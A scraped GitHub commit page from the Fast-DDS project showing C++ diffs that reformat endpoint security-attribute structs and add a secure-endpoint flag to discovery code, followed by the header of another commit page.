|  |  | } |
|  |  |  |
|  |  | explicit PluginEndpointSecurityAttributes( |
|  |  | const PluginEndpointSecurityAttributesMask mask) |
|  |  | : is\_submessage\_encrypted((mask & PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_ENCRYPTED) != 0) |
|  |  | , is\_submessage\_origin\_authenticated((mask & |
|  |  | PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_ORIGIN\_AUTHENTICATED) != 0) |
|  |  | , is\_payload\_encrypted((mask & PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_PAYLOAD\_ENCRYPTED) != 0) |
|  |  | { |
|  |  | } |
|  |  |  |
| Expand All | | @@ -54,11 +59,21 @@ struct PluginEndpointSecurityAttributes |
|  |  | inline PluginEndpointSecurityAttributesMask mask() const |
|  |  | { |
|  |  | PluginEndpointSecurityAttributesMask rv = PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_VALID; |
|  |  | if (is\_submessage\_encrypted) rv |= PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_ENCRYPTED; |
|  |  | if (is\_submessage\_origin\_authenticated) rv |= PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_ORIGIN\_AUTHENTICATED; |
|  |  | if (is\_payload\_encrypted) rv |= PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_PAYLOAD\_ENCRYPTED; |
|  |  | if (is\_submessage\_encrypted) |
|  |  | { |
|  |  | rv |= PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_ENCRYPTED; |
|  |  | } |
|  |  | if (is\_submessage\_origin\_authenticated) |
|  |  | { |
|  |  | rv |= PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_ORIGIN\_AUTHENTICATED; |
|  |  | } |
|  |  | if (is\_payload\_encrypted) |
|  |  | { |
|  |  | rv |= PLUGIN\_ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_PAYLOAD\_ENCRYPTED; |
|  |  | } |
|  |  | return rv; |
|  |  | } |
|  |  |  |
|  |  | }; |
|  |  |  |
|  |  | typedef uint32\_t EndpointSecurityAttributesMask; |
| Expand All | | @@ -74,23 +89,30 @@ typedef uint32\_t EndpointSecurityAttributesMask; |
|  |  |  |
|  |  | struct EndpointSecurityAttributes |
|  |  | { |
|  |  | EndpointSecurityAttributes() : |
|  |  | is\_read\_protected(true), is\_write\_protected(true), |
|  |  | is\_discovery\_protected(false), is\_liveliness\_protected(false), |
|  |  | is\_submessage\_protected(false), is\_payload\_protected(false), is\_key\_protected(false), |
|  |  | plugin\_endpoint\_attributes(0UL) |
|  |  | {} |
|  |  |  |
|  |  | explicit EndpointSecurityAttributes(const EndpointSecurityAttributesMask mask) : |
|  |  | is\_read\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_READ\_PROTECTED) != 0), |
|  |  | is\_write\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_WRITE\_PROTECTED) != 0), |
|  |  | is\_discovery\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_DISCOVERY\_PROTECTED) != 0), |
|  |  | is\_liveliness\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_LIVELINESS\_PROTECTED) != 0), |
|  |  | is\_submessage\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_PROTECTED) != 0), |
|  |  | is\_payload\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_PAYLOAD\_PROTECTED) != 0), |
|  |  | is\_key\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_KEY\_PROTECTED) != 0), |
|  |  | plugin\_endpoint\_attributes(0UL) |
|  |  | {} |
|  |  | EndpointSecurityAttributes() |
|  |  | : is\_read\_protected(false) |
|  |  | , is\_write\_protected(false) |
|  |  | , is\_discovery\_protected(false) |
|  |  | , is\_liveliness\_protected(false) |
|  |  | , is\_submessage\_protected(false) |
|  |  | , is\_payload\_protected(false) |
|  |  | , is\_key\_protected(false) |
|  |  | , plugin\_endpoint\_attributes(0UL) |
|  |  | { |
|  |  | } |
|  |  |  |
|  |  | explicit EndpointSecurityAttributes( |
|  |  | const EndpointSecurityAttributesMask mask) |
|  |  | : is\_read\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_READ\_PROTECTED) != 0) |
|  |  | , is\_write\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_WRITE\_PROTECTED) != 0) |
|  |  | , is\_discovery\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_DISCOVERY\_PROTECTED) != 0) |
|  |  | , is\_liveliness\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_LIVELINESS\_PROTECTED) != 0) |
|  |  | , is\_submessage\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_PROTECTED) != 0) |
|  |  | , is\_payload\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_PAYLOAD\_PROTECTED) != 0) |
|  |  | , is\_key\_protected((mask & ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_KEY\_PROTECTED) != 0) |
|  |  | , plugin\_endpoint\_attributes(0UL) |
|  |  | { |
|  |  | } |
|  |  |  |
|  |  | bool is\_read\_protected; |
|  |  |  |
| Expand All | | @@ -111,27 +133,50 @@ struct EndpointSecurityAttributes |
|  |  | inline EndpointSecurityAttributesMask mask() const |
|  |  | { |
|  |  | EndpointSecurityAttributesMask rv = ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_VALID; |
|  |  | if (is\_read\_protected) rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_READ\_PROTECTED; |
|  |  | if (is\_write\_protected) rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_WRITE\_PROTECTED; |
|  |  | if (is\_discovery\_protected) rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_DISCOVERY\_PROTECTED; |
|  |  | if (is\_liveliness\_protected) rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_LIVELINESS\_PROTECTED; |
|  |  | if (is\_submessage\_protected) rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_PROTECTED; |
|  |  | if (is\_payload\_protected) rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_PAYLOAD\_PROTECTED; |
|  |  | if (is\_key\_protected) rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_KEY\_PROTECTED; |
|  |  | if (is\_read\_protected) |
|  |  | { |
|  |  | rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_READ\_PROTECTED; |
|  |  | } |
|  |  | if (is\_write\_protected) |
|  |  | { |
|  |  | rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_WRITE\_PROTECTED; |
|  |  | } |
|  |  | if (is\_discovery\_protected) |
|  |  | { |
|  |  | rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_DISCOVERY\_PROTECTED; |
|  |  | } |
|  |  | if (is\_liveliness\_protected) |
|  |  | { |
|  |  | rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_LIVELINESS\_PROTECTED; |
|  |  | } |
|  |  | if (is\_submessage\_protected) |
|  |  | { |
|  |  | rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_SUBMESSAGE\_PROTECTED; |
|  |  | } |
|  |  | if (is\_payload\_protected) |
|  |  | { |
|  |  | rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_PAYLOAD\_PROTECTED; |
|  |  | } |
|  |  | if (is\_key\_protected) |
|  |  | { |
|  |  | rv |= ENDPOINT\_SECURITY\_ATTRIBUTES\_FLAG\_IS\_KEY\_PROTECTED; |
|  |  | } |
|  |  | return rv; |
|  |  | } |
|  |  |  |
|  |  | inline bool match(const EndpointSecurityAttributesMask remoteMask, |
|  |  | const PluginEndpointSecurityAttributesMask remotePluginMask) const |
|  |  | inline bool match( |
|  |  | const EndpointSecurityAttributesMask remoteMask, |
|  |  | const PluginEndpointSecurityAttributesMask remotePluginMask) const |
|  |  | { |
|  |  | return security\_mask\_matches(mask(), remoteMask) && |
|  |  | security\_mask\_matches(plugin\_endpoint\_attributes, remotePluginMask); |
|  |  | security\_mask\_matches(plugin\_endpoint\_attributes, remotePluginMask); |
|  |  | } |
|  |  |  |
|  |  | }; |
|  |  |  |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | } // namespace security |
|  |  | } // namespace rtps |
|  |  | } // namespace fastrtps |
|  |  | } // namespace eprosima |
|  |  |  |
|  |  | #endif // \_FASTDDS\_RTPS\_SECURITY\_ACCESSCONTROL\_ENDPOINTSECURITYATTRIBUTES\_H\_ |

14 changes: 9 additions & 5 deletions

14
[src/cpp/rtps/builtin/discovery/endpoint/EDPSimple.cpp](#diff-87d4f80f7a794b767f4d500c78d71c7bc447f87026ce3c1f45269911638a0427 "src/cpp/rtps/builtin/discovery/endpoint/EDPSimple.cpp")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/src/cpp/rtps/builtin/discovery/endpoint/EDPSimple.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -825,7 +825,8 @@ bool EDPSimple::removeLocalReader( |
|  |  | } |
|  |  |  |
|  |  | void EDPSimple::assignRemoteEndpoints( |
|  |  | const ParticipantProxyData& pdata) |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool assign\_secure\_endpoints) |
|  |  | { |
|  |  | EPROSIMA\_LOG\_INFO(RTPS\_EDP, "New DPD received, adding remote endpoints to our SimpleEDP endpoints"); |
|  |  | const NetworkFactory& network = mp\_RTPSParticipant->network\_factory(); |
| Expand Down  Expand Up | | @@ -890,7 +891,7 @@ void EDPSimple::assignRemoteEndpoints( |
|  |  | #if HAVE\_SECURITY |
|  |  | auxendp = endp; |
|  |  | auxendp &= DISC\_BUILTIN\_ENDPOINT\_PUBLICATION\_SECURE\_ANNOUNCER; |
|  |  | if (auxendp != 0 && publications\_secure\_reader\_.first != nullptr) |
|  |  | if (auxendp != 0 && publications\_secure\_reader\_.first != nullptr && assign\_secure\_endpoints) |
|  |  | { |
|  |  | temp\_writer\_proxy\_data->guid().entityId = sedp\_builtin\_publications\_secure\_writer; |
|  |  | temp\_writer\_proxy\_data->set\_persistence\_entity\_id(sedp\_builtin\_publications\_secure\_writer); |
| Expand All | | @@ -906,7 +907,7 @@ void EDPSimple::assignRemoteEndpoints( |
|  |  |  |
|  |  | auxendp = endp; |
|  |  | auxendp &= DISC\_BUILTIN\_ENDPOINT\_PUBLICATION\_SECURE\_DETECTOR; |
|  |  | if (auxendp != 0 && publications\_secure\_writer\_.first != nullptr) |
|  |  | if (auxendp != 0 && publications\_secure\_writer\_.first != nullptr && assign\_secure\_endpoints) |
|  |  | { |
|  |  | temp\_reader\_proxy\_data->guid().entityId = sedp\_builtin\_publications\_secure\_reader; |
|  |  | if (!mp\_RTPSParticipant->security\_manager().discovered\_builtin\_reader( |
| Expand All | | @@ -920,7 +921,7 @@ void EDPSimple::assignRemoteEndpoints( |
|  |  |  |
|  |  | auxendp = endp; |
|  |  | auxendp &= DISC\_BUILTIN\_ENDPOINT\_SUBSCRIPTION\_SECURE\_ANNOUNCER; |
|  |  | if (auxendp != 0 && subscriptions\_secure\_reader\_.first != nullptr) |
|  |  | if (auxendp != 0 && subscriptions\_secure\_reader\_.first != nullptr && assign\_secure\_endpoints) |
|  |  | { |
|  |  | temp\_writer\_proxy\_data->guid().entityId = sedp\_builtin\_subscriptions\_secure\_writer; |
|  |  | temp\_writer\_proxy\_data->set\_persistence\_entity\_id(sedp\_builtin\_subscriptions\_secure\_writer); |
| Expand All | | @@ -936,7 +937,7 @@ void EDPSimple::assignRemoteEndpoints( |
|  |  |  |
|  |  | auxendp = endp; |
|  |  | auxendp &= DISC\_BUILTIN\_ENDPOINT\_SUBSCRIPTION\_SECURE\_DETECTOR; |
|  |  | if (auxendp != 0 && subscriptions\_secure\_writer\_.first != nullptr) |
|  |  | if (auxendp != 0 && subscriptions\_secure\_writer\_.first != nullptr && assign\_secure\_endpoints) |
|  |  | { |
|  |  | EPROSIMA\_LOG\_INFO(RTPS\_EDP, "Adding SEDP Sub Reader to my Sub Writer"); |
|  |  | temp\_reader\_proxy\_data->guid().entityId = sedp\_builtin\_subscriptions\_secure\_reader; |
| Expand All | | @@ -948,7 +949,10 @@ void EDPSimple::assignRemoteEndpoints( |
|  |  | subscriptions\_secure\_writer\_.first->getGuid()); |
|  |  | } |
|  |  | } |
|  |  | #else |
|  |  | static\_cast<void>(assign\_secure\_endpoints); |
|  |  | #endif // if HAVE\_SECURITY |
|  |  |  |
|  |  | } |
|  |  |  |
|  |  | void EDPSimple::removeRemoteEndpoints( |
| Expand Down | |  |

3 changes: 2 additions & 1 deletion

3
[src/cpp/rtps/builtin/discovery/endpoint/EDPStatic.cpp](#diff-c384bfe7dae7ef4c25c6eb09efa63f6e82c47b5a7dafed43f439bfb225202cd5 "src/cpp/rtps/builtin/discovery/endpoint/EDPStatic.cpp")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/src/cpp/rtps/builtin/discovery/endpoint/EDPStatic.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -407,7 +407,8 @@ bool EDPStatic::removeLocalWriter( |
|  |  | } |
|  |  |  |
|  |  | void EDPStatic::assignRemoteEndpoints( |
|  |  | const ParticipantProxyData& pdata) |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool /\*assign\_secure\_endpoints\*/) |
|  |  | { |
|  |  | GUID\_t persistence\_guid; |
|  |  |  |
| Expand Down | |  |

5 changes: 3 additions & 2 deletions

5
[src/cpp/rtps/builtin/discovery/participant/PDPClient.cpp](#diff-ea4a9f4ae59cc71c3bb0478382c893462a95bae2c0d8504b19dfb13a1a984457 "src/cpp/rtps/builtin/discovery/participant/PDPClient.cpp")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/src/cpp/rtps/builtin/discovery/participant/PDPClient.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -506,7 +506,8 @@ void PDPClient::assignRemoteEndpoints( |
|  |  | } |
|  |  |  |
|  |  | void PDPClient::notifyAboveRemoteEndpoints( |
|  |  | const ParticipantProxyData& pdata) |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool /\*notify\_secure\_endpoints\*/) |
|  |  | { |
|  |  | #if HAVE\_SECURITY |
|  |  | if (mp\_RTPSParticipant->is\_secure()) |
| Expand Down  Expand Up | | @@ -575,7 +576,7 @@ void PDPClient::perform\_builtin\_endpoints\_matching( |
|  |  | // No EDP notification needed. EDP endpoints would be match when PDP synchronization is granted |
|  |  | if (mp\_builtin->mp\_WLP != nullptr) |
|  |  | { |
|  |  | mp\_builtin->mp\_WLP->assignRemoteEndpoints(pdata); |
|  |  | mp\_builtin->mp\_WLP->assignRemoteEndpoints(pdata, true); |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down | |  |

3 changes: 2 additions & 1 deletion

3
[src/cpp/rtps/builtin/discovery/participant/PDPClient.h](#diff-85be9b4a6d1abc0f4513b8a68cb76bfe771840413246ce3885d5afb902b3c203 "src/cpp/rtps/builtin/discovery/participant/PDPClient.h")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/src/cpp/rtps/builtin/discovery/participant/PDPClient.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -123,7 +123,8 @@ class PDPClient : public PDP |
|  |  | void removeRemoteEndpoints( |
|  |  | ParticipantProxyData\* pdata) override; |
|  |  | void notifyAboveRemoteEndpoints( |
|  |  | const ParticipantProxyData& pdata) override; |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool notify\_secure\_endpoints) override; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* This method removes a remote RTPSParticipant and all its writers and readers. |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[src/cpp/rtps/builtin/discovery/participant/PDPListener.cpp](#diff-4716be00d7038bf256e2eab48c89d12d41cc1c253e4e7c68ce075c2a61d33060 "src/cpp/rtps/builtin/discovery/participant/PDPListener.cpp")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/src/cpp/rtps/builtin/discovery/participant/PDPListener.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -197,7 +197,7 @@ void PDPListener::onNewCacheChangeAdded( |
|  |  |  |
|  |  | if (parent\_pdp\_->updateInfoMatchesEDP()) |
|  |  | { |
|  |  | parent\_pdp\_->mp\_EDP->assignRemoteEndpoints(\*pdata); |
|  |  | parent\_pdp\_->mp\_EDP->assignRemoteEndpoints(\*pdata, true); |
|  |  | } |
|  |  |  |
|  |  | lock.unlock(); |
| Expand Down | |  |

7 changes: 4 additions & 3 deletions

7
[src/cpp/rtps/builtin/discovery/participant/PDPServer.cpp](#diff-56b23866a90ffcf208e729e2afdd347e81a0a903eec3531272b0a3ba983536c5 "src/cpp/rtps/builtin/discovery/participant/PDPServer.cpp")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/src/cpp/rtps/builtin/discovery/participant/PDPServer.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -676,7 +676,8 @@ void PDPServer::assignRemoteEndpoints( |
|  |  | } |
|  |  |  |
|  |  | void PDPServer::notifyAboveRemoteEndpoints( |
|  |  | const ParticipantProxyData& pdata) |
|  |  | const ParticipantProxyData& pdata, |
|  |  | bool /\*notify\_secure\_endpoints\*/) |
|  |  | { |
|  |  | static\_cast<void>(pdata); |
|  |  | #if HAVE\_SECURITY |
| Expand Down  Expand Up | | @@ -723,12 +724,12 @@ void PDPServer::perform\_builtin\_endpoints\_matching( |
|  |  | //Inform EDP of new RTPSParticipant data: |
|  |  | if (mp\_EDP != nullptr) |
|  |  | { |
|  |  | mp\_EDP->assignRemoteEndpoints(pdata); |
|  |  | mp\_EDP->assignRemoteEndpoints(pdata, true); |
|  |  | } |
|  |  |  |
|  |  | if (mp\_builtin->mp\_WLP != nullptr) |
|  |  | { |
|  |  | mp\_builtin->mp\_WLP->assignRemoteEndpoints(pdata); |
|  |  | mp\_builtin->mp\_WLP->assignRemoteEndpoints(pdata, true); |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down | |  |

3 changes: 2 additions & 1 deletion

3
[src/cpp/rtps/builtin/discovery/participant/PDPServer.hpp](#diff-88016934dac6369da3df35e053da7a3260ba53d297675a90b4a70744b135f247 "src/cpp/rtps/builtin/discovery/participant/PDPServer.hpp")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/src/cpp/rtps/builtin/discovery/participant/PDPServer.hpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -135,7 +135,8 @@ class PDPServer : public fastrtps::rtps::PDP |
|  |  | void removeRemoteEndpoints( |
|  |  | fastrtps::rtps::ParticipantProxyData\* pdata) override; |
|  |  | void notifyAboveRemoteEndpoints( |
|  |  | const fastrtps::rtps::ParticipantProxyData& pdata) override; |
|  |  | const fastrtps::rtps::ParticipantProxyData& pdata, |
|  |  | bool notify\_secure\_endpoints) override; |
|  |  |  |
|  |  | #if HAVE\_SECURITY |
|  |  | bool pairing\_remote\_writer\_with\_local\_reader\_after\_security( |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[src/cpp/rtps/builtin/discovery/participant/PDPServerListener.cpp](#diff-3a8f686d09809f275db1349ffa8f940e5636fcfaf94fa2be5e3348e353283b56 "src/cpp/rtps/builtin/discovery/participant/PDPServerListener.cpp")

Show comments

[View file](/eProsima/Fast-DDS/blob/f07a0213e655202188840b864be4438ae1067a13/src/cpp/rtps/builtin/discovery/participant/PDPServerListener.cpp)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -357,7 +357,7 @@ void PDPServerListener::onNewCacheChangeAdded( |
|  |  | // Included form symmetry with PDPListener to profit from a future updateInfoMatchesEDP override |
|  |  | if (pdp\_server()->updateInfoMatchesEDP() && is\_local) |
|  |  | { |
|  |  | pdp\_server()->mp\_EDP->assignRemoteEndpoints(\*pdata); |
|  |  | pdp\_server()->mp\_EDP->assignRemoteEndpoints(\*pdata, true); |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `f07a021`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fcommit%2Ff07a0213e655202188840b864be4438ae1067a13) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_60531ca4_20250110_231632.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fcommit%2F072cbc9d6a71d869a5cbed1873c0cdd6cf67cda4)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fcommit%2F072cbc9d6a71d869a5cbed1873c0cdd6cf67cda4)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=eProsima%2FFast-DDS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eProsima](/eProsima)
/
**[Fast-DDS](/eProsima/Fast-DDS)**
Public

* [Notifications](/login?return_to=%2FeProsima%2FFast-DDS) You must be signed in to change notification settings
* [Fork
  787](/login?return_to=%2FeProsima%2FFast-DDS)
* [Star
   2.3k](/login?return_to=%2FeProsima%2FFast-DDS)

* [Code](/eProsima/Fast-DDS)
* [Issues
  48](/eProsima/Fast-DDS/issues)
* [Pull requests
  78](/eProsima/Fast-DDS/pulls)
* [Discussions](/eProsima/Fast-DDS/discussions)
* [Actions](/eProsima/Fast-DDS/actions)
* [Projects
  0](/eProsima/Fast-DDS/projects)
* [Security](/eProsima/Fast-DDS/security)
* [Insights](/eProsima/Fast-DDS/pulse)

Additional navigation options

* [Code](/eProsima/Fast-DDS)
* [Issues](/eProsima/Fast-DDS/issues)
* [Pull requests](/eProsima/Fast-DDS/pulls)
* [Discussions](/eProsima/Fast-DDS/discussions)
* [Actions](/eProsima/Fast-DDS/actions)
* [Projects](/eProsima/Fast-DDS/projects)
* [Security](/eProsima/Fast-DDS/security)
* [Insights](/eProsima/Fast-DDS/pulse)

## Commit

[Permalink](/eProsima/Fast-DDS/commit/072cbc9d6a71d869a5cbed1873c0cdd6cf67cda4)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Refs [#1811](https://github.com/eProsima/Fast-DDS/pull/1811). WIP SecurityManager.

[Browse files](/eProsima/Fast-DDS/tree/072cbc9d6a71d869a5cbed1873c0cdd6cf67cda4)
Browse the repository at this point in the history

* Loading branch information

[![@richiprosima](https://avatars.githubusercontent.com/u/7736122?s=40&v=4)](/richiprosima)

[richiprosima](/eProsima/Fast-DDS/commits?author=richiprosima "View all commits by richiprosima")
committed
Nov 16, 2016

1 parent
